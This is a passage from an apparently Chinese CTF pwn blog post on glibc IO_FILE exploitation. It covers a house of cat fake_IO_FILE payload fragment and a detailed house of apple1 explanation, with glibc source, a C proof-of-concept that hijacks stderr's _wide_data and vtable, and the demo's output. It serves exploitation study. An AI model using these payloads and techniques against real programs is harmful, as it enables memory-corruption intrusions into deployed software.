class="line">fake_IO_FILE += p64(heapbase+<span class="number">0x1000</span>)  <span class="comment"># _lock = a writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xa0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0x30</span>)<span class="comment">#_wide_data,rax1_addr</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) <span class="comment">#mode=1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xd8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libcbase+<span class="number">0x2160c0</span>+<span class="number">0x10</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)  <span class="comment"># rax2_addr</span></span><br></pre></td></tr></table></figure><h2 id="例题-6"><a href="#例题-6" class="headerlink" title="例题"></a>例题</h2><p><strong>2022强网-house of cat</strong></p><h1 id="house-of-apple1"><a href="#house-of-apple1" class="headerlink" title="house of apple1"></a>house of apple1</h1><h2 id="概要-14"><a href="#概要-14" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>house of apple1利用largebin attack 修改_IO_list_all,然后主要是利用控制_wide_data字段,以及vtable偏移调用_IO_wstrn_jumps,从而做到修改内存为已知值</p><p><code>house of apple1</code> 的利用链可以在任意地址写堆地址，相当于再一次<code>largebin attack</code>的效果。因此，<code>house of apple1</code> 需要和其他方法结合而进行后续的<code>FSOP</code>利用。</p><p><strong>利用条件:</strong></p><ol><li>程序从<code>main</code>函数返回或能调用<code>exit</code>函数</li><li>能够泄露堆地址和libc基址</li><li>能使用一次<code>largebin attack</code>（一次即可）</li><li>能够触发IO流(FSOP或触发__malloc_assert,或者程序中存在puts等能进入IO链的函数),执行IO相关函数</li></ol><p><strong>利用效果:</strong>任意地址写堆地址—&gt;控制流</p><p><strong>有效版本:</strong>2.36及以前</p><p><strong>失效原因:</strong>2.37开始,不再存在_IO_wstrn_overflow函数,甚至去除了整个_IO_wstrn_jumps</p><h2 id="原理-14"><a href="#原理-14" class="headerlink" title="原理"></a>原理</h2><p><strong>前言:</strong>众所周知，<code>glibc</code>高版本逐渐移除了<code>__malloc_hook/__free_hook/__realloc_hook</code>等等一众<code>hook</code>全局变量，<code>ctf</code>中<code>pwn</code>题对<code>hook</code>钩子的利用将逐渐成为过去式。而想要在高版本利用成功，基本上就离不开对<code>IO_FILE</code>结构体的伪造与<code>IO</code>流的攻击。之前很多师傅都提出了一些优秀的攻击方法，比如house of pig,house of kiwi和 house of emma等。</p><p>其中，<code>house of pig</code>除了需要劫持<code>IO_FILE</code>结构体，还需要劫持<code>tcache_perthread_struct</code>结构体或者能控制任意地址分配；<code>house of kiwi</code>则至少需要修改三个地方的值：<code>_IO_helper_jumps + 0xA0</code>和<code>_IO_helper_jumps + 0xA8</code>，另外还要劫持<code>_IO_file_jumps + 0x60</code>处的<code>_IO_file_sync</code>指针；而<code>house of emma</code>则至少需要修改两个地方的值，一个是<code>tls</code>结构体的<code>point_guard</code>(或者想办法泄露出来)，另外需要<strong>伪造一个<code>IO_FILE</code>或替换<code>vtable</code>为<code>xxx_cookie_jumps</code>的地址。</strong></p><p>总的来看，如果想使用上述方法成功地攻击<code>IO</code>，至少需要两次写或者一次写和一次任意地址读。而在只给一次任意地址写（如一次<code>largebin attack</code>）的情景下是很难利用成功的。</p><p><code>largebin attack</code>是高版本中为数不多的可以任意地址写一个堆地址的方法，并常常和上述三种方法结合起来利用。本文将给出一种新的利用方法，在仅使用一次<code>largebin attack</code>并限制读写次数的条件下进行<code>FSOP</code>利用。顺便说一下，house of banana 也只需要一次<code>largebin attack</code>，但是其攻击的是<code>rtld_global</code>结构体，而不是<code>IO</code>流。</p><hr><p>当程序从<code>main</code>函数返回或者执行<code>exit</code>函数的时候，均会调用<code>fcloseall</code>函数，该调用链为：</p><ul><li>exit<ul><li>fcloseall<ul><li>_IO_cleanup<ul><li>_IO_flush_all_lockp(_IO_flush_all)<ul><li>_IO_OVERFLOW</li></ul></li></ul></li></ul></li></ul></li></ul><p>最后会遍历<code>_IO_list_all</code>存放的每一个<code>IO_FILE</code>结构体，如果满足条件的话，会调用每个结构体中<code>vtable-&gt;_overflow</code>函数指针指向的函数。</p><p>使用<code>largebin attack</code>可以劫持<code>_IO_list_all</code>变量，将其替换为伪造的<code>IO_FILE</code>结构体，而在此时，我们其实仍可以继续利用某些<code>IO</code>流函数去修改其他地方的值。要想修改其他地方的值，就离不开<code>_IO_FILE</code>的一个成员<code>_wide_data</code>的利用</p><p>在伪造<code>_IO_FILE</code>结构体的时候，伪造<code>_wide_data</code>变量，然后通过某些函数，比如<code>_IO_wstrn_overflow</code>就可以将已知地址空间上的某些值修改为一个已知值。</p><p><strong>glibc/libio/vswprintf.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">wint_t</span></span><br><span class="line">_IO_wstrn_overflow (FILE *fp, <span class="type">wint_t</span> c)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  _IO_wstrnfile *snf = (_IO_wstrnfile *) fp;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_wsetb (fp, snf-&gt;overflow_buf,</span><br><span class="line">         snf-&gt;overflow_buf + (<span class="keyword">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class="line">                      / <span class="keyword">sizeof</span> (<span class="type">wchar_t</span>)), <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_base = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_end = (snf-&gt;overflow_buf</span><br><span class="line">                      + (<span class="keyword">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class="line">                     / <span class="keyword">sizeof</span> (<span class="type">wchar_t</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_ptr = snf-&gt;overflow_buf;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_end = snf-&gt;overflow_buf;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_strfile f;</span><br><span class="line">  <span class="comment">/* This is used for the characters which do not fit in the buffer</span></span><br><span class="line"><span class="comment">     provided by the user.  */</span></span><br><span class="line">  <span class="type">wchar_t</span> overflow_buf[<span class="number">64</span>];</span><br><span class="line">&#125; _IO_wstrnfile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_strfile_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span> _<span class="title">sbf</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span> _<span class="title">s</span>;</span></span><br><span class="line">&#125; _IO_strfile;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  FILE _f;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_alloc_type _allocate_buffer_unused;</span><br><span class="line">  _IO_free_type _free_buffer_unused;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>分析一下这个函数，首先将<code>fp</code>强转为<code>_IO_wstrnfile *</code>指针，然后判断<code>fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf</code>是否成立（一般肯定是成立的），如果成立则会对<code>fp-&gt;_wide_data</code>的<code>_IO_write_base</code>、<code>_IO_read_base</code>、<code>_IO_read_ptr</code>和<code>_IO_read_end</code>赋值为<code>snf-&gt;overflow_buf</code>或者与该地址一定范围内偏移的值；最后对<code>fp-&gt;_wide_data</code>的<code>_IO_write_ptr</code>和<code>_IO_write_end</code>赋值。</p><p>也就是说，只要控制了<code>fp-&gt;_wide_data</code>，就可以控制从<code>fp-&gt;_wide_data</code>开始一定范围内的内存的值，也就等同于<strong>任意地址写已知地址</strong>。</p><p>这里有时候需要绕过<code>_IO_wsetb</code>函数里面的<code>free</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wsetb (FILE *f, <span class="type">wchar_t</span> *b, <span class="type">wchar_t</span> *eb, <span class="type">int</span> a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF))</span><br><span class="line">    <span class="built_in">free</span> (f-&gt;_wide_data-&gt;_IO_buf_base); <span class="comment">//使上面两个条件至少有一个不满足</span></span><br><span class="line">  f-&gt;_wide_data-&gt;_IO_buf_base = b;</span><br><span class="line">  f-&gt;_wide_data-&gt;_IO_buf_end = eb;</span><br><span class="line">  <span class="keyword">if</span> (a)</span><br><span class="line">    f-&gt;_flags2 &amp;= ~_IO_FLAGS2_USER_WBUF;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    f-&gt;_flags2 |= _IO_FLAGS2_USER_WBUF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>_IO_wstrnfile</code>涉及到的结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_strfile f;</span><br><span class="line">  <span class="comment">/* This is used for the characters which do not fit in the buffer</span></span><br><span class="line"><span class="comment">     provided by the user.  */</span></span><br><span class="line">  <span class="type">wchar_t</span> overflow_buf[<span class="number">64</span>];</span><br><span class="line">&#125; _IO_wstrnfile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_strfile_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span> _<span class="title">sbf</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span> _<span class="title">s</span>;</span></span><br><span class="line">&#125; _IO_strfile;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  FILE _f;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_alloc_type _allocate_buffer_unused;</span><br><span class="line">  _IO_free_type _free_buffer_unused;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中，<code>overflow_buf</code>相对于<code>_IO_FILE</code>结构体的偏移为<code>0xf0</code>，在<code>vtable</code>后面。</p><p>而<code>struct _IO_wide_data</code>结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;    <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;    <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;    <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;    <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;    <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;    <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;    <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;        <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;    <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;    <span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">                   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;    <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"> </span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> _<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>换而言之，假如此时在堆上伪造一个<code>_IO_FILE</code>结构体并已知其地址为<code>A</code>，将<code>A + 0xd8</code>替换为<code>_IO_wstrn_jumps</code>地址，<code>A + 0xc0</code>设置为<code>B</code>，并设置其他成员以便能调用到<code>_IO_OVERFLOW</code>。<code>exit</code>函数则会一路调用到<code>_IO_wstrn_overflow</code>函数，并将<code>B</code>至<code>B + 0x38</code>的地址区域的内容都替换为<code>A + 0xf0</code>或者<code>A + 0x1f0</code>。</p><p>一个<code>demo</code>程序验证：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] allocate a 0x100 chunk&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);</span><br><span class="line">    <span class="type">size_t</span> *tmp = p1;</span><br><span class="line">    <span class="type">size_t</span> old_value = <span class="number">0x1122334455667788</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span> / <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        p1[i] = old_value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================old value=======================&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%p]: 0x%016lx  0x%016lx\n&quot;</span>, tmp, tmp[<span class="number">0</span>], tmp[<span class="number">1</span>]);</span><br><span class="line">        tmp += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================old value=======================&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>)&amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] puts address: %p\n&quot;</span>, (<span class="type">void</span> *)puts_addr);</span><br><span class="line">    <span class="type">size_t</span> stderr_write_ptr_addr = puts_addr + <span class="number">0x1997b8</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_IO_write_ptr address: %p\n&quot;</span>, (<span class="type">void</span> *)stderr_write_ptr_addr);</span><br><span class="line">    <span class="type">size_t</span> stderr_flags2_addr = puts_addr + <span class="number">0x199804</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_flags2 address: %p\n&quot;</span>, (<span class="type">void</span> *)stderr_flags2_addr);</span><br><span class="line">    <span class="type">size_t</span> stderr_wide_data_addr = puts_addr + <span class="number">0x199830</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_wide_data address: %p\n&quot;</span>, (<span class="type">void</span> *)stderr_wide_data_addr);</span><br><span class="line">    <span class="type">size_t</span> sdterr_vtable_addr = puts_addr + <span class="number">0x199868</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;vtable address: %p\n&quot;</span>, (<span class="type">void</span> *)sdterr_vtable_addr);</span><br><span class="line">    <span class="type">size_t</span> _IO_wstrn_jumps_addr = puts_addr + <span class="number">0x194ed0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_wstrn_jumps address: %p\n&quot;</span>, (<span class="type">void</span> *)_IO_wstrn_jumps_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 1: change stderr-&gt;_IO_write_ptr to -1&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)stderr_write_ptr_addr = (<span class="type">size_t</span>)<span class="number">-1</span>;<span class="comment">//满足_IO_OVERFLOW (fp, EOF)</span></span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 2: change stderr-&gt;_flags2 to 8&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)stderr_flags2_addr = <span class="number">8</span>;<span class="comment">//io_wsetb绕过</span></span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 3: replace stderr-&gt;_wide_data with the allocated chunk&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)stderr_wide_data_addr = (<span class="type">size_t</span>)p1;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 4: replace stderr-&gt;vtable with _IO_wstrn_jumps&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)sdterr_vtable_addr = (<span class="type">size_t</span>)_IO_wstrn_jumps_addr;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 5: call fcloseall and trigger house of apple&quot;</span>);</span><br><span class="line">    fcloseall();</span><br><span class="line">    tmp = p1;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================new value=======================&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%p]: 0x%016lx  0x%016lx\n&quot;</span>, tmp, tmp[<span class="number">0</span>], tmp[<span class="number">1</span>]);</span><br><span class="line">        tmp += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================new value=======================&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[*] allocate a <span class="number">0x100</span> chunk</span><br><span class="line">===========================old value=======================</span><br><span class="line">[<span class="number">0x55cfb956d2a0</span>]: <span class="number">0x1122334455667788</span>  <span class="number">0x1122334455667788</span></span><br><span class="line">[<span class="number">0x55cfb956d2b0</span>]: <span class="number">0x1122334455667788</span>  <span class="number">0x1122334455667788</span></span><br><span class="line">[<span class="number">0x55cfb956d2c0</span>]: <span class="number">0x1122334455667788</span>  <span class="number">0x1122334455667788</span></span><br><span class="line">[<span class="number">0x55cfb956d2d0</span>]: <span class="number">0x1122334455667788</span>  <span class="number">0x1122334455667788</span></span><br><span class="line">===========================old value=======================</span><br><span class="line">[*] <span class="built_in">puts</span> address: <span class="number">0x7f648b8a6ef0</span></span><br><span class="line">[*] <span class="built_in">stderr</span>-&gt;_IO_write_ptr address: <span class="number">0x7f648ba406a8</span></span><br><span class="line">[*] <span class="built_in">stderr</span>-&gt;_flags2 address: <span class="number">0x7f648ba406f4</span></span><br><span class="line">[*] <span class="built_in">stderr</span>-&gt;_wide_data address: <span class="number">0x7f648ba40720</span></span><br><span class="line">[*] <span class="built_in">stderr</span>-&gt;vtable address: <span class="number">0x7f648ba40758</span></span><br><span class="line">[*] _IO_wstrn_jumps address: <span class="number">0x7f648ba3bdc0</span></span><br><span class="line">[+] step <span class="number">1</span>: change <span class="built_in">stderr</span>-&gt;_IO_write_ptr to <span class="number">-1</span></span><br><span class="line">[+] step <span class="number">2</span>: change <span class="built_in">stderr</span>-&gt;_flags2 to <span class="number">8</span></span><br><span class="line">[+] step <span class="number">3</span>: replace <span class="built_in">stderr</span>-&gt;_wide_data with the allocated chunk</span><br><span class="line">[+] step <span class="number">4</span>: replace <span class="built_in">stderr</span>-&gt;vtable with _IO_wstrn_jumps</span><br><span class="line">[+] step <span class="number">5</span>: call fcloseall and trigger house of apple</span><br><span class="line">===========================new value=======================</span><br><span class="line">[<span class="number">0x55cfb956d2a0</span>]: <span class="number">0x00007f648ba40770</span>  <span class="number">0x00007f648ba40870</span></span><br><span class="line">[<span class="number">0x55cfb956d2b0</span>]: <span class="number">0x00007f648ba40770</span>  <span class="number">0x00007f648ba40770</span></span><br><span class="line">[<span class="number">0x55cfb956d2c0</span>]: <span class="number">0x00007f648ba40770</span>  <span class="number">0x00007f648ba40770</span></span><br><span class="line">[<span class="number">0x55cfb956d2d0</span>]: <span class="number">0x00007f648ba40770</span>  <span class="number">0x00007f648ba40870</span></span><br><span class="line">===========================new value=======================</span><br></pre></td></tr></table></figure><p>可以看到_wide_data指向的连续八个size_t内存都被修改</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>从上面的分析可以，在只给了<code>1</code>次<code>largebin attack</code>的前提下，能利用<code>_IO_wstrn_overflow</code>函数将任意地址空间上的值修改为一个已知地址，并且这个已知地址通常为堆地址。那么，当伪造两个甚至多个<code>_IO_FILE</code>结构体，并将这些结构体通过<code>chain</code>字段串联起来就能进行组合利用。基于此，有至少四种利用思路。</p><h3 id="思路一：修改tcache线程变量"><a href="#思路一：修改tcache线程变量" class="headerlink" title="思路一：修改tcache线程变量"></a>思路一：修改<code>tcache</code>线程变量</h3><p>该思路需要借助<code>house of pig</code>的思想，利用<code>_IO_str_overflow</code>中的<code>malloc</code>进行任意地址分配，<code>memcpy</code>进行任意地址覆盖。其代码片段如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span 